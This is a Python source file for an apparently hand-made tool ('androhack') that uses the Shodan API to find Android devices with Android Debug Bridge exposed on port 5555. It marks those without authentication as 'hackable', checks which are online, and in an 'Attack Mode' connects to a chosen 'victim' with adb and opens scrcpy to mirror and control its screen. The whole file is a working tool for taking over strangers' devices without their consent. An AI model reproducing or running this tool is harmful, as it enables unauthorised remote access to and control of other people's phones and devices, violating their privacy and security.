#!/bin/python3

import os
import sys
import json
import shodan
import socket
import random
import threading
import subprocess
from colorama import Fore, Style


# Define the search query
query = 'Android Debug Bridge'

# Initialize an empty list to store the IP addresses
ip_list = []
hackable_ip = []
alive_ip = []
alive = False





def load_ip_file():
    global ip_list, hackable_ip
    home_dir = os.path.expanduser("~")
    folder_path = os.path.join(home_dir, ".androhack")
    ip_list_file = os.path.join(folder_path, "ip_list.txt")
    hackable_ip_file = os.path.join(folder_path, "hackable_ip_list.txt")
    try:
        with open(ip_list_file, "r") as f:
            ip_list = json.load(f)
            f.close()
        with open(hackable_ip_file, "r") as f:
            hackable_ip = json.load(f)
            f.close()
    except Exception as e:
        # print(f"Error: {e}")
        print("No Data Available")
        update_device_list()





def adb_restart():
    subprocess.run(['adb', 'kill-server'])
    subprocess.run(['adb', 'start-server'])





def setup():
    adb_restart()
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Set Working Directory
    home_dir = os.path.expanduser("~")
    folder_path = os.path.join(home_dir, ".androhack")

    # Display LOGO
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    random_color = random.choice(colors)
    logo = os.path.join(folder_path, "logo.txt")
    with open(logo, 'r') as f:
        logo_contents = f.read()
        f.close()
    print(random_color + logo_contents + Style.RESET_ALL)
    
    # Setup the API client
    api_key = os.path.join(folder_path, "shodan_api_key.txt")
    with open(api_key, 'r') as file:
        api_key = file.read().strip()
        file.close()
    global api
    api = shodan.Shodan(api_key)





    

def update_device_list():
    global ip_list, hackable_ip, alive
    print(Fore.MAGENTA + "Updating Device List, please wait ... " + Style.RESET_ALL, end=" ")
    sys.stdout.flush() # Clearing Buffer
    try:
        # Search Shodan
        results = api.search(query)
        # Add the IP addresses to the list
        for result in results['matches']:
            banner = result['data']
            ip_list.append(result['ip_str'])        
            if 'Authentication is required' not in banner:
                hackable_ip.append(result['ip_str'])

    except shodan.APIError as e:
        print(f"Error: {e}")
    print()

    # Config for workspace
    home_dir = os.path.expanduser("~")
    folder_path = os.path.join(home_dir, ".androhack")
    ip_file = os.path.join(folder_path, "ip_list.txt")
    hackable_ip_file = os.path.join(folder_path, "hackable_ip_list.txt")
    # If there is old data, concate with new ones
    ip_temp = []
    hack_temp = []
    try: 
        with open(ip_file, "r") as f:
            ip_temp = json.load(f)
            f.close()
        with open(hackable_ip_file, "r") as f:
            hack_temp = json.load(f)
            f.close()
        # Concate old data with new ones
        ip_list = ip_list + ip_temp
        ip_list = list(set(ip_list))
        hackable_ip = hackable_ip + hack_temp
        hackable_ip = list(set(hackable_ip))
        del ip_temp, hack_temp
    except Exception:
        pass
    # Update list into the File
    with open(ip_file, "w") as f:
        json.dump(ip_list, f)
        f.close()
    with open(hackable_ip_file, "w") as f:
        json.dump(hackable_ip, f)
        f.close()
    alive = False
    print(Fore.GREEN + "Data Updated !!!" + Style.RESET_ALL)







def display_status():
    print()
    print(Fore.YELLOW + "Total Devices: " + str(len(ip_list)) + Style.RESET_ALL)
    print(Fore.YELLOW + "Hackable: " + str(len(hackable_ip)) + Style.RESET_ALL)
    print(Fore.YELLOW + "Online: " + str(len(alive_ip)) + Style.RESET_ALL)






def show_options():
    print()
    print("1) Refresh Database")
    print("2) Check Online Devices")
    print("3) Display Status")
    print("4) Attack Mode")
    print("0) Exit")
    print()






# def alive_devices():
#     print(Fore.MAGENTA + "Checking Currently Alive Devices, please wait ... " + Style.RESET_ALL, end=" ")
#     sys.stdout.flush() # Clearing Buffer
#     for ip in hackable_ip:
#         try:
#             # Attempt to connect to port 5555
#             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             s.settimeout(1)
#             s.connect((ip, 5555))
#             s.close()
#             # If the connection succeeds, add the IP to the list
#             alive_ip.append(ip)
#             # print(f"IP {ip} is alive on port 5555")
#         except (socket.timeout, ConnectionRefusedError):
#             # If the connection fails, continue to the next IP
#             pass
#     print()

def check_ip(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip, 5555))
        s.close()
        alive_ip.append(ip)
    except (socket.timeout, ConnectionRefusedError):
        pass

def alive_devices():
    print(Fore.MAGENTA + "Checking Currently Alive Devices, please wait ... " + Style.RESET_ALL, end=" ")
    sys.stdout.flush()
    threads = []
    for ip in hackable_ip:
        t = threading.Thread(target=check_ip, args=(ip,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    global alive
    alive = True
    print()
    print(Fore.GREEN + "Done !!!" + Style.RESET_ALL)






def connect_adb(ip_address):
    # Define the ADB command to connect to the device
    adb_cmd = f"adb connect {ip_address}:5555"

    # Run the ADB command using subprocess
    process = subprocess.Popen(adb_cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    # Check if the connection was successful
    if "connected" in str(output):
        print(f"Successfully connected to {ip_address}")
    else:
        print(f"Failed to connect to {ip_address}")
        print(f"Error message: {error.decode('utf-8').strip()}")






def connect_adb_scrcpy(ip_address):
    # Define the ADB command to connect to the device
    adb_cmd = f"adb connect {ip_address}:5555"

    # Run the ADB command using subprocess
    process = subprocess.Popen(adb_cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    # Check if the connection was successful
    if "connected" in str(output):
        print(f"Successfully connected to {ip_address}")

        # Use ADB to forward the device's screen to your computer using scrcpy
        scrcpy_cmd = "scrcpy"
        subprocess.call(scrcpy_cmd, shell=True)

    else:
        print(f"Failed to connect to {ip_address}")
        print(f"Error message: {error.decode('utf-8').strip()}")






def connectWithVictim():
    print()
    print(Fore.GREEN + "Currently Online: " + Style.RESET_ALL)
    for index, value in enumerate(alive_ip):
        print(f"Index: {index}, IP: {value}")
    print()
    x = input("Enter Index => ")
    x = int(x)
    try:
        connect_adb_scrcpy(alive_ip[x])
    except Exception:
        pass
    subprocess.run(['adb', 'disconnect'])





if __name__ == "__main__":

    setup()
    load_ip_file()

    while True:   
        show_options()
        x = int(input("Select Option => "))
        if (x == 0):
            exit(0)
        elif (x == 1):
            update_device_list()
            continue
        elif (x == 2):
            alive_devices()

        if not alive:
            print("This operation needs to check online devices first.")
            alive_devices()

        if (x == 3):
            display_status()
        elif (x == 4):
            while True:
                connectWithVictim()
                print()
                print(Fore.YELLOW + "Press any key to continue or 'q' to quit:" + Style.RESET_ALL, end=" ")
                key = input()
                print() 
                if (key == "Q" or key == "q"):
                    break
    